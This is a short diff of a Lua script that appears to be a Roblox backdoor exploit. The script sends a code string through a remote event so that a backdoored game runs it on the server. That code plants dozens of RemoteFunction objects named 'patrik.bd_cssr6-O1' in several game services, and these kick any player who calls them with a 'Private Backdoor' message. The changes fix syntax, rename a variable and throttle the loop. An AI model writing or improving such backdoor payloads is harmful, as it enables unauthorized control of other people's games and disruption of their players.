@@ -3233,10 +3233,10 @@ end
 ]])  
 
 fireRemoteEvent([[
-	local services = {
+local services = {
     game:GetService("PathfindingService"),
     game:GetService("PolicyService"),
-    game:GetService("Workspace")
+    game:GetService("Workspace"),
     game:GetService("TestService"),
     game:GetService("FriendService"),
     game:GetService("SoundService"),
@@ -3249,13 +3249,14 @@ fireRemoteEvent([[
 }
 
 for _, svc in ipairs(services) do
-  for r = 1, 100 do 
-    local r = Instance.new("RemoteFunction")
-    r.Name = "patrik.bd_cssr6-O1"
-    r.OnServerInvoke = function(player)
+  for r = 1, 50 do 
+    local s = Instance.new("RemoteFunction")
+    s.Name = "patrik.bd_cssr6-O1"
+    s.OnServerInvoke = function(player)
         player:Kick("Backdoor has been secured by Patrikk - Private Backdoor.")
     end
-    r.Parent = svc
+    s.Parent = svc
+    task.wait()
   end
 end]])
 
